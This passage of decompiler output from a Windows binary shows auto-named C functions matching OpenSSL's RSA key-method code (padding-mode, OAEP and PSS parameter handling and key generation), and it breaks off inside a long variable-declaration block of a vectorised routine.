      if ( sub_407130(Size, a2, *(_DWORD *)(v6 + 32), v8) <= 0 )
        return 0;
      return sub_4CCC90(v8, a4, *(int **)(v6 + 20), *(_DWORD *)(v6 + 24), *(_BYTE **)(v6 + 32), *(_DWORD *)(v6 + 28)) > 0;
    }
    return -1;
  }
  if ( sub_468610(a1, 0, &a1, a2, Size) <= 0 )
    return 0;
  result = a1;
LABEL_17:
  if ( result != a5 )
    return 0;
  v14 = *(_BYTE **)(v6 + 32);
  v15 = (_BYTE *)a4;
  if ( result >= 4 )
  {
    while ( *(_DWORD *)v15 == *(_DWORD *)v14 )
    {
      result -= 4;
      v14 += 4;
      v15 += 4;
      if ( result < 4 )
        return !result || *v14 == *v15 && (result <= 1 || v14[1] == v15[1] && (result <= 2 || v14[2] == v15[2]));
    }
    return 0;
  }
  return !result || *v14 == *v15 && (result <= 1 || v14[1] == v15[1] && (result <= 2 || v14[2] == v15[2]));
}

//----- (00468910) --------------------------------------------------------
int __cdecl sub_468910(int a1, int a2, _DWORD *a3, const void *a4, int Size)
{
  int v5; // esi
  int v6; // ebx
  int v7; // eax
  void *v8; // eax
  int result; // eax

  v5 = *(_DWORD *)(a1 + 20);
  if ( *(_DWORD *)(v5 + 16) == 4 )
  {
    v6 = sub_4070E0(*(_DWORD *)(*(_DWORD *)(a1 + 8) + 20));
    if ( !*(_DWORD *)(v5 + 32) )
    {
      v7 = sub_41CA90(*(_DWORD *)(a1 + 8));
      v8 = sub_4133F0(v7);
      *(_DWORD *)(v5 + 32) = v8;
      if ( !v8 )
        return -1;
    }
    if ( !sub_428E80(
            *(_BYTE **)(v5 + 32),
            v6,
            a4,
            Size,
            *(_DWORD *)(v5 + 36),
            *(_DWORD *)(v5 + 40),
            *(char **)(v5 + 20),
            *(_DWORD *)(v5 + 24)) )
      return -1;
    result = sub_407100(v6, *(_DWORD *)(v5 + 32), a2, *(_DWORD *)(*(_DWORD *)(a1 + 8) + 20));
  }
  else
  {
    result = sub_407100(Size, (int)a4, a2, *(_DWORD *)(*(_DWORD *)(a1 + 8) + 20));
  }
  if ( result >= 0 )
  {
    *a3 = result;
    return 1;
  }
  return result;
}

//----- (004689E0) --------------------------------------------------------
int __cdecl sub_4689E0(int a1, void *a2, int *a3, int a4, int a5)
{
  int v5; // esi
  int v6; // eax
  void *v7; // eax
  int result; // eax
  int i; // ecx

  v5 = *(_DWORD *)(a1 + 20);
  if ( *(_DWORD *)(v5 + 16) != 4 )
  {
    result = sub_407120(a5, a4, (int)a2, *(_DWORD *)(*(_DWORD *)(a1 + 8) + 20));
LABEL_11:
    if ( result >= 0 )
    {
      *a3 = result;
      return 1;
    }
    return result;
  }
  if ( !*(_DWORD *)(v5 + 32) )
  {
    v6 = sub_41CA90(*(_DWORD *)(a1 + 8));
    v7 = sub_4133F0(v6);
    *(_DWORD *)(v5 + 32) = v7;
    if ( !v7 )
      return -1;
  }
  result = sub_407120(a5, a4, *(_DWORD *)(v5 + 32), *(_DWORD *)(*(_DWORD *)(a1 + 8) + 20));
  if ( result > 0 )
  {
    for ( i = 0; i < result; ++i )
    {
      if ( *(_BYTE *)(*(_DWORD *)(v5 + 32) + i) )
        break;
    }
    result = sub_429070(
               a2,
               result,
               (const void *)(i + *(_DWORD *)(v5 + 32)),
               result - i,
               result,
               *(_DWORD *)(v5 + 36),
               *(_DWORD *)(v5 + 40),
               *(char **)(v5 + 20),
               *(_DWORD *)(v5 + 24));
    goto LABEL_11;
  }
  return result;
}

//----- (00468AC0) --------------------------------------------------------
int __usercall sub_468AC0@<eax>(int a1@<esi>, int a2)
{
  int v3; // eax

  if ( !a2 )
    return 1;
  v3 = sub_435D30(a2);
  if ( a1 == 3 )
  {
    sub_408310(4, 140, 141, (int)"crypto\\rsa\\rsa_pmeth.c", 335);
    return 0;
  }
  if ( a1 == 5 )
  {
    if ( sub_429960(v3) == -1 )
    {
      sub_408310(4, 140, 142, (int)"crypto\\rsa\\rsa_pmeth.c", 341);
      return 0;
    }
    return 1;
  }
  if ( v3 <= 114 )
  {
    if ( v3 != 114 )
    {
      switch ( v3 )
      {
        case 3:
        case 4:
        case 64:
        case 95:
          return 1;
        default:
          goto LABEL_17;
      }
    }
    return 1;
  }
  if ( v3 > 257 )
  {
    if ( v3 >= 672 && v3 <= 675 )
      return 1;
  }
  else if ( v3 == 257 || v3 == 117 )
  {
    return 1;
  }
LABEL_17:
  sub_408310(4, 140, 157, (int)"crypto\\rsa\\rsa_pmeth.c", 361);
  return 0;
}

//----- (00468C10) --------------------------------------------------------
int __cdecl sub_468C10(int a1, int a2, int a3, _DWORD *a4)
{
  int v4; // edi
  int result; // eax
  bool v6; // zf
  int v7; // ecx
  int v8; // eax

  v4 = *(_DWORD *)(a1 + 20);
  if ( a2 > 13 )
  {
    switch ( a2 )
    {
      case 4097:
        if ( (unsigned int)(a3 - 1) > 5 )
          goto LABEL_22;
        if ( !sub_468AC0(a3, *(_DWORD *)(v4 + 20)) )
          return 0;
        if ( a3 == 6 )
        {
          v6 = (*(_BYTE *)(a1 + 16) & 0x18) == 0;
        }
        else
        {
          if ( a3 != 4 )
            goto LABEL_20;
          v6 = (*(_DWORD *)(a1 + 16) & 0x300) == 0;
        }
        if ( v6 )
        {
LABEL_22:
          sub_408310(4, 143, 144, (int)"crypto\\rsa\\rsa_pmeth.c", 396);
          goto LABEL_7;
        }
        if ( !*(_DWORD *)(v4 + 20) )
          *(_DWORD *)(v4 + 20) = sub_42BEA0();
LABEL_20:
        *(_DWORD *)(v4 + 16) = a3;
        return 1;
      case 4098:
      case 4103:
        if ( *(_DWORD *)(v4 + 16) != 6 )
        {
          sub_408310(4, 143, 146, (int)"crypto\\rsa\\rsa_pmeth.c", 406);
          goto LABEL_7;
        }
        if ( a2 == 4103 )
        {
          *a4 = *(_DWORD *)(v4 + 28);
          return 1;
        }
        if ( a3 < -2 )
          goto LABEL_7;
        *(_DWORD *)(v4 + 28) = a3;
        return 1;
      case 4099:
        if ( a3 < 512 )
        {
          sub_408310(4, 143, 120, (int)"crypto\\rsa\\rsa_pmeth.c", 420);
          goto LABEL_7;
        }
        *(_DWORD *)v4 = a3;
        return 1;
      case 4100:
        if ( a4 && sub_416E20((int)a4) && !sub_416DC0((int)a4) )
        {
          sub_417060(*(void ***)(v4 + 4));
          *(_DWORD *)(v4 + 4) = a4;
          return 1;
        }
        sub_408310(4, 143, 101, (int)"crypto\\rsa\\rsa_pmeth.c", 428);
        goto LABEL_7;
      case 4101:
      case 4104:
        v7 = *(_DWORD *)(v4 + 16);
        if ( v7 != 6 && v7 != 4 )
        {
          sub_408310(4, 143, 156, (int)"crypto\\rsa\\rsa_pmeth.c", 461);
          goto LABEL_7;
        }
        if ( a2 == 4104 )
        {
          v8 = *(_DWORD *)(v4 + 24);
          if ( v8 )
            *a4 = v8;
          else
            *a4 = *(_DWORD *)(v4 + 20);
          return 1;
        }
        else
        {
          *(_DWORD *)(v4 + 24) = a4;
          return 1;
        }
      case 4102:
        *a4 = *(_DWORD *)(v4 + 16);
        return 1;
      case 4105:
      case 4107:
        if ( *(_DWORD *)(v4 + 16) != 4 )
        {
          sub_408310(4, 143, 141, (int)"crypto\\rsa\\rsa_pmeth.c", 438);
          goto LABEL_7;
        }
        if ( a2 == 4107 )
          *a4 = *(_DWORD *)(v4 + 20);
        else
          *(_DWORD *)(v4 + 20) = a4;
        return 1;
      case 4106:
        if ( *(_DWORD *)(v4 + 16) != 4 )
        {
          sub_408310(4, 143, 141, (int)"crypto\\rsa\\rsa_pmeth.c", 475);
          goto LABEL_7;
        }
        sub_413490(*(void **)(v4 + 36));
        if ( a4 && a3 > 0 )
        {
          *(_DWORD *)(v4 + 40) = a3;
          *(_DWORD *)(v4 + 36) = a4;
          result = 1;
        }
        else
        {
          *(_DWORD *)(v4 + 36) = 0;
          *(_DWORD *)(v4 + 40) = 0;
          result = 1;
        }
        break;
      case 4108:
        if ( *(_DWORD *)(v4 + 16) == 4 )
        {
          *a4 = *(_DWORD *)(v4 + 36);
          result = *(_DWORD *)(v4 + 40);
        }
        else
        {
          sub_408310(4, 143, 141, (int)"crypto\\rsa\\rsa_pmeth.c", 490);
LABEL_7:
          result = -2;
        }
        break;
      default:
        goto LABEL_7;
    }
  }
  else if ( a2 == 13 )
  {
    *a4 = *(_DWORD *)(v4 + 20);
    return 1;
  }
  else
  {
    switch ( a2 )
    {
      case 1:
        if ( !sub_468AC0(*(_DWORD *)(v4 + 16), (int)a4) )
          return 0;
        *(_DWORD *)(v4 + 20) = a4;
        result = 1;
        break;
      case 2:
        sub_408310(4, 143, 148, (int)"crypto\\rsa\\rsa_pmeth.c", 509);
        goto LABEL_7;
      case 3:
      case 4:
      case 5:
      case 7:
      case 9:
      case 10:
      case 11:
        return 1;
      default:
        goto LABEL_7;
    }
  }
  return result;
}

//----- (00468F60) --------------------------------------------------------
int __cdecl sub_468F60(int a1, const char *a2, char *String)
{
  char *v3; // edi
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // esi
  int v9; // eax
  int v10; // eax
  void *v11; // eax
  void *v12; // esi
  int v13; // edi

  v3 = String;
  if ( !String )
  {
    sub_408310(4, 144, 147, (int)"crypto\\rsa\\rsa_pmeth.c", 522);
    return 0;
  }
  if ( !strcmp(a2, "rsa_padding_mode") )
  {
    if ( !strcmp(String, "pkcs1") )
    {
      v5 = 1;
      return sub_443A60(a1, 6, -1, 4097, v5, 0);
    }
    if ( !strcmp(String, "sslv23") )
    {
      v5 = 2;
      return sub_443A60(a1, 6, -1, 4097, v5, 0);
    }
    if ( !strcmp(String, "none") )
    {
      v5 = 3;
      return sub_443A60(a1, 6, -1, 4097, v5, 0);
    }
    if ( !strcmp(String, "oeap") || !strcmp(String, "oaep") )
    {
      v5 = 4;
      return sub_443A60(a1, 6, -1, 4097, v5, 0);
    }
    if ( !strcmp(String, "x931") )
    {
      v5 = 5;
      return sub_443A60(a1, 6, -1, 4097, v5, 0);
    }
    if ( !strcmp(String, "pss") )
    {
      v5 = 6;
      return sub_443A60(a1, 6, -1, 4097, v5, 0);
    }
    sub_408310(4, 144, 118, (int)"crypto\\rsa\\rsa_pmeth.c", 542);
    return -2;
  }
  if ( !strcmp(a2, "rsa_pss_saltlen") )
  {
    v6 = atoi(String);
    return sub_443A60(a1, 6, 24, 4098, v6, 0);
  }
  if ( !strcmp(a2, "rsa_keygen_bits") )
  {
    v7 = atoi(String);
    return sub_443A60(a1, 6, 4, 4099, v7, 0);
  }
  if ( !strcmp(a2, "rsa_keygen_pubexp") )
  {
    String = 0;
    if ( sub_43A5A0((void ***)&String, v3) )
    {
      v8 = sub_443A60(a1, 6, 4, 4100, 0, (int)String);
      if ( v8 <= 0 )
        sub_417060((void **)String);
      return v8;
    }
    return 0;
  }
  if ( !strcmp(a2, "rsa_mgf1_md") )
  {
    v9 = sub_430D80((int)String);
    if ( v9 )
      return sub_443A60(a1, 6, 1016, 4101, 0, v9);
    sub_408310(4, 144, 157, (int)"crypto\\rsa\\rsa_pmeth.c", 574);
    return 0;
  }
  if ( !strcmp(a2, "rsa_oaep_md") )
  {
    v10 = sub_430D80((int)String);
    if ( v10 )
      return sub_443A60(a1, 6, 768, 4105, 0, v10);
    sub_408310(4, 144, 157, (int)"crypto\\rsa\\rsa_pmeth.c", 583);
    return 0;
  }
  if ( strcmp(a2, "rsa_oaep_label") )
    return -2;
  v11 = sub_424A20(String, &String);
  v12 = v11;
  if ( !v11 )
    return 0;
  v13 = sub_443A60(a1, 6, 768, 4106, (int)String, (int)v11);
  if ( v13 <= 0 )
    sub_413490(v12);
  return v13;
}

//----- (00469430) --------------------------------------------------------
int __usercall sub_469430@<eax>(__m64 a1@<mm0>, int a2, int a3)
{
  int *v3; // edi
  _DWORD *v4; // eax
  int result; // eax
  volatile LONG *v6; // ebx
  _DWORD *v7; // eax
  _DWORD *v8; // esi
  int v9; // edi

  v3 = *(int **)(a2 + 20);
  if ( !v3[1] )
  {
    v4 = sub_4168C0();
    v3[1] = (int)v4;
    if ( !v4 || !sub_417490(v4, 65537) )
      return 0;
  }
  result = sub_405910();
  v6 = (volatile LONG *)result;
  if ( result )
  {
    if ( *(_DWORD *)(a2 + 28) )
    {
      v7 = sub_416EC0();
      v8 = v7;
      if ( !v7 )
      {
        sub_405630(v6);
        return 0;
      }
      sub_4CB2A0(v7, a2);
    }
    else
    {
      v8 = 0;
    }
    v9 = sub_4CDE50(a1, (int)v6, *v3, (_DWORD *)v3[1], v8);
    sub_416F00(v8);
    if ( v9 <= 0 )
      sub_405630(v6);
    else
      sub_41CE20(a3, (void *)6, (int)v6);
    return v9;
  }
  return result;
}

//----- (00469500) --------------------------------------------------------
int __cdecl sub_469500(__m128i *a1, const __m128i *a2, int a3)
{
  int v4; // edx
  __int32 *v5; // ebp
  unsigned int *v6; // esi
  __int32 v7; // edi
  unsigned __int32 v8; // ecx
  unsigned __int32 v9; // edx
  unsigned __int32 v10; // ecx
  unsigned __int32 v11; // edx
  unsigned __int32 v12; // ecx
  unsigned __int32 v13; // edx
  unsigned __int32 v14; // ecx
  unsigned __int32 v15; // edx
  __int32 v16; // ebx
  __int32 v17; // ecx
  __int32 v18; // edx
  int v19; // esi
  int v20; // ebx
  __int32 v21; // esi
  int v22; // eax
  __int32 v23; // edi
  int v24; // edx
  int v25; // esi
  __int32 v26; // edx
  int v27; // ecx
  int v28; // edi
  __int32 v29; // ecx
  int v30; // ebx
  int v31; // edx
  __int32 v32; // ebx
  int v33; // eax
  int v34; // ecx
  __int32 v35; // eax
  int v36; // esi
  int v37; // ebx
  __int32 v38; // esi
  int v39; // edi
  int v40; // eax
  __int32 v41; // edi
  int v42; // edx
  int v43; // esi
  __int32 v44; // edx
  int v45; // ecx
  int v46; // edi
  __int32 v47; // ecx
  int v48; // ebx
  int v49; // edx
  __int32 v50; // ebx
  int v51; // eax
  int v52; // ecx
  __int32 v53; // eax
  int v54; // esi
  int v55; // ebx
  __int32 v56; // esi
  int v57; // edi
  int v58; // eax
  __int32 v59; // edi
  int v60; // edx
  int v61; // esi
  __int32 v62; // edx
  int v63; // ecx
  int v64; // edi
  __int32 v65; // ecx
  int v66; // eax
  int v67; // edx
  __int32 v68; // ebx
  int v69; // esi
  int v70; // ecx
  __int32 v71; // eax
  int v72; // edi
  int v73; // ebx
  __int32 v74; // esi
  int v75; // edx
  int v76; // eax
  __int32 v77; // edi
  int v78; // ecx
  int v79; // esi
  __int32 v80; // edx
  int v81; // ebx
  int v82; // edi
  __int32 v83; // ecx
  int v84; // eax
  int v85; // edx
  __int32 v86; // ebx
  int v87; // esi
  int v88; // ecx
  __int32 v89; // eax
  int v90; // edi
  int v91; // ebx
  __int32 v92; // esi
  int v93; // edx
  int v94; // eax
  __int32 v95; // edi
  int v96; // ecx
  int v97; // esi
  __int32 v98; // edx
  int v99; // ebx
  int v100; // edi
  __int32 v101; // ecx
  int v102; // eax
  int v103; // edx
  __int32 v104; // ebx
  int v105; // esi
  int v106; // ecx
  __int32 v107; // eax
  int v108; // edi
  int v109; // ebx
  __int32 v110; // esi
  int v111; // edx
  int v112; // eax
  __int32 v113; // edi
  int v114; // ecx
  int v115; // esi
  __int32 v116; // edx
  int v117; // ebx
  int v118; // edi
  __int32 v119; // ecx
  int v120; // eax
  int v121; // edx
  __int32 v122; // ebx
  int v123; // esi
  int v124; // ecx
  __int32 v125; // eax
  int v126; // edi
  int v127; // ebx
  __int32 v128; // esi
  int v129; // edx
  int v130; // eax
  __int32 v131; // edi
  int v132; // ecx
  int v133; // esi
  __int32 v134; // edx
  int v135; // ebx
  int v136; // edi
  __int32 v137; // ecx
  int v138; // ebp
  int v139; // edx
  __int32 v140; // ebx
  int v141; // ebp
  int v142; // ecx
  __int32 v143; // eax
  int v144; // ebp
  int v145; // ebx
  __int32 v146; // esi
  int v147; // ebp
  int v148; // eax
  __int32 v149; // edi
  int v150; // ebp
  int v151; // esi
  __int32 v152; // edx
  int v153; // ebp
  int v154; // edi
  __int32 v155; // ecx
  int v156; // ebp
  int v157; // edx
  __int32 v158; // ebx
  int v159; // ebp
  int v160; // ecx
  __int32 v161; // eax
  int v162; // ebp
  int v163; // ebx
  __int32 v164; // esi
  int v165; // ebp
  int v166; // eax
  __int32 v167; // edi
  int v168; // ebp
  int v169; // esi
  __int32 v170; // edx
  int v171; // ebp
  int v172; // edi
  __int32 v173; // ecx
  int v174; // ebp
  int v175; // edx
  __int32 v176; // ebx
  int v177; // ebp
  int v178; // ecx
  __int32 v179; // eax
  int v180; // ebp
  int v181; // ebx
  __int32 v182; // esi
  int v183; // ebp
  int v184; // eax
  __int32 v185; // edi
  int v186; // ebp
  int v187; // esi
  __int32 v188; // edx
  int v189; // ebp
  int v190; // edi
  __int32 v191; // ecx
  int v192; // ebp
  int v193; // edx
  __int32 v194; // ebx
  int v195; // ebp
  int v196; // ecx
  __int32 v197; // eax
  int v198; // edi
  int v199; // ebx
  __int32 v200; // esi
  int v201; // edx
  int v202; // eax
  __int32 v203; // edi
  int v204; // ecx
  int v205; // esi
  __int32 v206; // edx
  int v207; // ebx
  int v208; // edi
  __int32 v209; // ecx
  int v210; // eax
  int v211; // edx
  __int32 v212; // ebx
  int v213; // esi
  int v214; // ecx
  __int32 v215; // eax
  int v216; // edi
  int v217; // ebx
  __int32 v218; // esi
  int v219; // edx
  int v220; // eax
  __int32 v221; // edi
  int v222; // ecx
  int v223; // esi
  __int32 v224; // edx
  int v225; // ebx
  int v226; // edi
  __int32 v227; // ecx
  int v228; // eax
  int v229; // edx
  __int32 v230; // ebx
  int v231; // esi
  int v232; // ecx
  __int32 v233; // eax
  int v234; // edi
  int v235; // ebx
  __int32 v236; // esi
  int v237; // edx
  int v238; // eax
  __int32 v239; // edi
  int v240; // ecx
  int v241; // esi
  __int32 v242; // edx
  int v243; // ebx
  int v244; // edi
  __int32 v245; // ecx
  int v246; // eax
  int v247; // edx
  __int32 v248; // ebx
  int v249; // esi
  int v250; // ecx
  int v251; // eax
  int v252; // edi
  int v253; // ebx
  int v254; // esi
  int v255; // edi
  __int32 v256; // esi
  int result; // eax
  __int32 v258; // ebx
  __int32 v259; // ecx
  const __m128i *v260; // esi
  int v261; // ecx
  __m128i si128; // xmm3
  __m128i v378; // xmm7
  int v379; // eax
  __int32 v380; // ebx
  int v381; // ecx
  __int32 v382; // edx
  __int32 v383; // edi
  __m128i v384; // xmm3
  __m128i v385; // xmm0
  __m128i v386; // xmm1
  __m128i v387; // xmm2
  __m128i v388; // xmm4
  int v389; // esi
  int v390; // ebp
  int v391; // ebx
  int v392; // eax
  int v393; // ebp
  int v394; // ebx
  int v395; // esi
  int v396; // eax
  int v397; // edi
  int v398; // esi
  int v399; // eax
  __m128i v400; // xmm6
  int v401; // ebp
  int v402; // edi
  int v403; // edx
  __m128i v404; // xmm7
  int v405; // ebp
  int v406; // edi
  int v407; // esi
  int v408; // edx
  int v409; // ecx
  int v410; // esi
  __m128i v411; // xmm4
  int v412; // edx
  int v413; // ebp
  int v414; // ecx
  __m128i v415; // xmm0
  int v416; // ebx
  int v417; // ebp
  int v418; // ecx
  int v419; // esi
  int v420; // ebx
  int v421; // eax
  int v422; // esi
  int v423; // ebx
  __m128i v424; // xmm7
  int v425; // ebp
  int v426; // eax
  int v427; // edi
  __m128i v428; // xmm0
  int v429; // ebp
  int v430; // eax
  int v431; // esi
  int v432; // edi
  int v433; // edx
  int v434; // esi
  __m128i v435; // xmm5
  int v436; // edi
  int v437; // ebp
  int v438; // edx
  __m128i v439; // xmm1
  int v440; // ecx
  int v441; // ebp
  int v442; // edx
  int v443; // esi
  int v444; // ecx
  int v445; // ebx
  int v446; // esi
  int v447; // ecx
  __m128i v448; // xmm0
  int v449; // ebp
  int v450; // ebx
  int v451; // eax
  __m128i v452; // xmm1
  int v453; // ebp
  int v454; // ebx
  __m128i v455; // xmm6
  __m128i v456; // xmm0
  int v457; // esi
  int v458; // eax
  int v459; // edi
  int v460; // esi
  __m128i v461; // xmm6
  int v462; // eax
  int v463; // ebp
  int v464; // edi
  __m128i v465; // xmm2
  int v466; // edx
  int v467; // ebp
  int v468; // edi
  int v469; // esi
  int v470; // edx
  int v471; // ecx
  int v472; // esi
  int v473; // edx
  __m128i v474; // xmm1
  int v475; // ebp
  int v476; // ecx
  int v477; // ebx
  __m128i v478; // xmm2
  int v479; // ebp
  int v480; // ecx
  __m128i v481; // xmm7
  __m128i v482; // xmm1
  int v483; // esi
  int v484; // ebx
  int v485; // eax
  __m128i v486; // xmm3
  int v487; // esi
  __m128i v488; // xmm7
  int v489; // ebx
  int v490; // ebp
  int v491; // eax
  int v492; // edi
  int v493; // ebp
  int v494; // eax
  __m128i v495; // xmm2
  int v496; // esi
  int v497; // edi
  int v498; // edx
  int v499; // esi
  int v500; // edi
  int v501; // ebp
  int v502; // edx
  int v503; // ecx
  __m128i v504; // xmm0
  int v505; // ebp
  __m128i v506; // xmm2
  int v507; // edx
  int v508; // esi
  int v509; // ebx
  int v510; // ecx
  int v511; // ebp
  int v512; // eax
  __m128i v513; // xmm1
  __m128i v514; // xmm5
  int v515; // ebx
  int v516; // esi
  int v517; // edi
  __m128i v518; // xmm3
  int v519; // eax
  int v520; // ebp
  int v521; // edx
  int v522; // edi
  __m128i v523; // xmm1
  __m128i v524; // xmm3
  int v525; // esi
  int v526; // ecx
  int v527; // edx
  int v528; // ebp
  int v529; // ebx
  __m128i v530; // xmm2
  __m128i v531; // xmm6
  int v532; // ecx
  int v533; // esi
  int v534; // eax
  __m128i v535; // xmm4
  int v536; // ebx
  int v537; // ebp
  int v538; // edi
  int v539; // eax
  __m128i v540; // xmm2
  __m128i v541; // xmm4
  int v542; // esi
  int v543; // edx
  int v544; // edi
  int v545; // ebp
  int v546; // ecx
  int v547; // edx
  int v548; // esi
  int v549; // ebx
  __m128i v550; // xmm5
  int v551; // ecx
  int v552; // ebp
  int v553; // eax
  int v554; // ebx
  __m128i v555; // xmm3
  __m128i v556; // xmm5
  int v557; // esi
  int v558; // edi
  int v559; // eax
  int v560; // ebp
  int v561; // edx
  __m128i v562; // xmm4
  __m128i v563; // xmm0
  int v564; // edi
  int v565; // esi
  int v566; // ecx
  __m128i v567; // xmm6
  int v568; // edx
  int v569; // ebp
  int v570; // ebx
  int v571; // ecx
  __m128i v572; // xmm4
  __m128i v573; // xmm6
  int v574; // esi
  int v575; // eax
  int v576; // ebx
  int v577; // ebp
  int v578; // edi
  int v579; // eax
  int v580; // esi
  int v581; // edx
  __m128i v582; // xmm7
  int v583; // edi
  int v584; // ebp
  int v585; // ecx
  int v586; // edx
  int v587; // ebx
  __m128i v588; // xmm5
  __m128i v589; // xmm7
  int v590; // ecx
  int v591; // esi
  int v592; // ebx
  int v593; // esi
  int v594; // ecx
  int v595; // eax
  int v596; // esi
  int v597; // ecx
  int v598; // ebx
  __m128i v599; // xmm6
  int v600; // ebp
  int v601; // eax
  __m128i v602; // xmm2
  int v603; // ebp
  int v604; // ebx
  int v605; // edi
  int v606; // ebp
  __m128i v607; // xmm0
  int v608; // ebx
  int v609; // eax
  int v610; // esi
  int v611; // edi
  int v612; // esi
  int v613; // eax
  int v614; // edx
  int v615; // esi
  int v616; // eax
  int v617; // edi
  __m128i v618; // xmm6
  int v619; // ebp
  __m128i v620; // xmm0
  int v621; // edx
  int v622; // ebp
  int v623; // edi
  int v624; // ecx
  int v625; // ebp
  int v626; // edi
  int v627; // edx
  int v628; // esi
  int v629; // ecx
  int v630; // esi
  int v631; // edx
  int v632; // ebx
  int v633; // esi
  int v634; // edx
  int v635; // ecx
  __m128i v636; // xmm7
  int v637; // ebp
  int v638; // ebx
  __m128i v639; // xmm3
  int v640; // ebp
  int v641; // ecx
  int v642; // eax
  int v643; // ebp
  __m128i v644; // xmm1
  int v645; // ecx
  int v646; // ebx
  int v647; // esi
  int v648; // eax
  int v649; // esi
  int v650; // ebx
  int v651; // edi
  int v652; // esi
  int v653; // ebx
  int v654; // eax
  __m128i v655; // xmm7
  int v656; // ebp
  __m128i v657; // xmm1
  int v658; // edi
  int v659; // ebp
  int v660; // eax
  int v661; // edx
  int v662; // ebp
  int v663; // eax
  int v664; // edi
  int v665; // esi
  int v666; // edx
  int v667; // esi
  int v668; // edi
  int v669; // ecx
  int v670; // esi
  int v671; // edi
  int v672; // edx
  int v673; // ebp
  int v674; // ecx
  int v675; // ebp
  int v676; // edx
  int v677; // ebx
  int v678; // ebp
  __m128i v679; // xmm2
  int v680; // edx
  int v681; // ecx
  int v682; // esi
  int v683; // ebx
  int v684; // esi
  int v685; // ecx
  int v686; // eax
  int v687; // esi
  int v688; // ecx
  int v689; // ebx
  __m128i v690; // xmm0
  int v691; // ebp
  __m128i v692; // xmm2
  int v693; // eax
  int v694; // ebp
  int v695; // ebx
  int v696; // edi
  int v697; // ebp
  int v698; // ebx
  int v699; // eax
  int v700; // esi
  int v701; // edi
  int v702; // esi
  int v703; // eax
  int v704; // edx
  int v705; // esi
  int v706; // eax
  int v707; // edi
  __m128i v708; // xmm1
  int v709; // ebp
  int v710; // edx
  __m128i v711; // xmm5
  int v712; // ebp
  int v713; // edi
  int v714; // ecx
  int v715; // ebp
  __m128i v716; // xmm3
  int v717; // edi
  int v718; // edx
  int v719; // esi
  int v720; // ecx
  int v721; // esi
  int v722; // edx
  int v723; // ebx
  int v724; // esi
  int v725; // edx
  int v726; // ecx
  __m128i v727; // xmm1
  int v728; // ebp
  __m128i v729; // xmm3
  int v730; // ebx
  int v731; // ebp
  int v732; // ecx
  int v733; // eax
  int v734; // ebp
  int v735; // ecx
  int v736; // ebx
  int v737; // esi
  int v738; // eax
  int v739; // esi
  int v740; // ebx
  int v741; // edi
  int v742; // esi
  int v743; // ebx
  int v744; // eax
  __m128i v745; // xmm2
  int v746; // ebp
  int v747; // edi
  __m128i v748; // xmm6
  int v749; // ebp
  int v750; // eax
  int v751; // edx
  int v752; // ebp
  __m128i v753; // xmm4
  int v754; // eax
  int v755; // edi
  int v756; // esi
  int v757; // edx
  int v758; // esi
  int v759; // edi
  int v760; // ecx
  int v761; // esi
  int v762; // edi
  int v763; // edx
  __m128i v764; // xmm2
  int v765; // ebp
  int v766; // ecx
  int v767; // ebp
  int v768; // edx
  int v769; // ebx
  int v770; // ebp
  int v771; // edx
  int v772; // ecx
  int v773; // esi
  int v774; // ebx
  int v775; // ebp
  int v776; // eax
  __m128i v777; // xmm3
  int v778; // ebx
  int v779; // esi
  int v780; // edi
  __m128i v781; // xmm5
  int v782; // eax
  int v783; // ebp
  int v784; // edx
  int v785; // edi
  int v786; // esi
  int v787; // ecx
  int v788; // edx
  int v789; // ebp
  int v790; // ebx
  int v791; // ecx
  int v792; // esi
  int v793; // eax
  int v794; // ebx
  int v795; // ebp
  int v796; // edi
  int v797; // eax
  int v798; // esi
  int v799; // edx
  int v800; // esi
  int v801; // edi
  int v802; // ecx
  __m128i v803; // xmm6
  __m128i v804; // xmm1
  __m128i v805; // xmm2
  __m128i v806; // xmm3
  __m128i v807; // xmm0
  int v808; // ebp
  int v809; // ecx
  int v810; // edx
  int v811; // esi
  int v812; // ebx
  int v813; // ecx
  int v814; // ebp
  int v815; // eax
  int v816; // ebx
  int v817; // esi
  int v818; // edi
  int v819; // eax
  int v820; // ebp
  int v821; // edx
  int v822; // edi
  int v823; // esi
  int v824; // ecx
  int v825; // edx
  int v826; // ebp
  int v827; // ebx
  int v828; // ecx
  int v829; // esi
  int v830; // eax
  int v831; // ebx
  int v832; // ebp
  int v833; // edi
  int v834; // eax
  int v835; // esi
  int v836; // edx
  int v837; // edi
  int v838; // ebp
  int v839; // ecx
  int v840; // edx
  int v841; // esi
  int v842; // eax
  _DWORD *v843; // ebp
  __int32 v844; // esi
  __int32 v845; // ebp
  int v846; // ebp
  int v847; // ecx
  int v848; // edx
  int v849; // esi
  int v850; // ebx
  int v851; // ecx
  int v852; // ebp
  int v853; // eax
  int v854; // ebx
  int v855; // esi
  int v856; // edi
  int v857; // eax
  int v858; // ebp
  int v859; // edx
  int v860; // edi
  int v861; // esi
  int v862; // ecx
  int v863; // edx
  int v864; // ebp
  int v865; // ebx
  int v866; // ecx
  int v867; // esi
  int v868; // eax
  int v869; // ebx
  int v870; // ebp
  int v871; // edi
  int v872; // eax
  int v873; // esi
  int v874; // edx
  int v875; // edi
  int v876; // ebp
  int v877; // ecx
  int v878; // edx
  int v879; // esi
  int v880; // eax
  _DWORD *v881; // ebp
  int v882; // esi
  int v883; // ecx
  int v884; // edx
  int v885; // edi
  __int32 v891; // eax
  __int32 v892; // ebx
  __int32 v893; // ecx
  __int32 v894; // edx
  __int32 v895; // edi
  int v907; // esi
  unsigned __int64 v908; // rt0
  __int32 v910; // ebp
  int v912; // ebx
  int v913; // eax
  int v915; // ebp
  int v917; // ebx
  int v919; // esi
  int v921; // eax
  int v922; // edi
  int v923; // esi
  int v925; // eax
  int v928; // ebp
  int v929; // edi
  int v930; // edx
  int v933; // ebp
  int v934; // edi
  int v937; // esi
  int v938; // edx
  int v939; // ecx
  int v941; // esi
  int v943; // edx
  int v945; // ebp
  int v947; // ecx
  int v948; // ebx
  int v950; // ebp
  int v952; // ecx
  int v954; // esi
  int v956; // ebx
  int v957; // eax
  int v958; // esi
  int v960; // ebx
  int v963; // ebp
  int v964; // eax
  int v965; // edi
  int v968; // ebp
  int v969; // eax
  int v972; // esi
  int v973; // edi
  int v974; // edx
  int v976; // esi
  int v978; // edi
  int v980; // ebp
  int v982; // edx
  int v983; // ecx
  int v985; // ebp
  int v987; // edx
  int v989; // esi
  int v991; // ecx
  int v992; // ebx
  int v993; // esi
  int v995; // ecx
  int v998; // ebp
  int v999; // ebx
  int v1000; // eax
  int v1003; // ebp
  int v1004; // ebx
  int v1008; // esi
